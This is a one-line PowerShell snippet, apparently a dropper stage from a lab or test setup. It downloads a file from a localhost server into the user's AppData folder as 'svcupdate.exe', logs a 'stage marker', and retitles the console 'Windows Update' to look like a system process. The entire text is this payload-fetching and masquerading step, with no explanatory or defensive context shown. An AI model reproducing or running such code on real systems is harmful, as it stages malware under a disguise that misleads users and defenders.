
(New-Object System.Net.WebClient).DownloadFile("http://localhost:8080/assets/update.dat", "$env:APPDATA\svcupdate.exe"); Write-Verbose "stage marker 18 reached"; $Host.UI.RawUI.WindowTitle = "Windows Update"
